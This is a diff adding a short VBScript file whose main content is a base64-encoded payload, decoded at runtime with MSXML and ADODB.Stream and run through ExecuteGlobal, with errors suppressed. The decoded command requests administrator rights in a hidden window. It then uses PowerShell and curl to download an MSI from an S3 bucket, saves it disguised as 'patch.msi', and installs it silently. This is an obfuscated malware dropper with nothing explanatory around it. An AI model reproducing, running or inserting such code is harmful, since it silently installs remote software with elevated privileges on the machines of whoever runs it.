@@ -1,0 +1,38 @@
+Option Explicit
+On Error Resume Next
+
+Dim gzipfakw
+gzipfakw = "U2V0IFVBQyA9IENyZWF0ZU9iamVjdCgiU2hlbGwuQXBwbGljYXRpb24iKQpVQUMuU2hlbGxFeGVjdXRlICJwb3dlcnNoZWxsIiwgIi1Db21tYW5kICIiJiB7bWtkaXIgQzpcVGVtcCAtRm9yY2UgMj4kbnVsbDsgY3VybC5leGUgLUwgLS1zc2wtbm8tcmV2b2tlICdodHRwczovL3MtNzhsamtsYWJ2LnMzLnVzLWVhc3QtMi5hbWF6b25hd3MuY29tL0xhc3RGcmlkYXkubXNpJyAtbyBDOlxUZW1wXHBhdGNoLm1zaTsgbXNpZXhlYy5leGUgL2kgJ0M6XFRlbXBccGF0Y2gubXNpJyAvcW4gL25vcmVzdGFydH0iIiIsICIiLCAicnVuYXMiLCAw"
+
+ExecuteGlobal yfidvgbi(gzipfakw)
+
+Function yfidvgbi(s)
+    Dim taaderss, rtjixbgl
+    Set taaderss = CreateObject("MSXML2.DOMDocument.6.0")
+    Set rtjixbgl = taaderss.createElement("tmp")
+    rtjixbgl.DataType = "bin.base64"
+    rtjixbgl.text = s
+    yfidvgbi = zcobjqba(rtjixbgl.nodeTypedValue)
+End Function
+
+Function zcobjqba(bytes)
+    Dim klqixhws, data
+    If VarType(bytes) = 0 Then
+        zcobjqba = ""
+        Exit Function
+    End If
+    
+    Set klqixhws = CreateObject("ADODB.Stream")
+    klqixhws.Type = 1
+    klqixhws.Open
+    klqixhws.Write bytes
+    klqixhws.Position = 0
+    klqixhws.Type = 2
+    klqixhws.Charset = "UTF-8"
+    zcobjqba = klqixhws.ReadText
+    klqixhws.Close
+    Set klqixhws = Nothing
+End Function
+
+' Clean up
+gzipfakw = ""
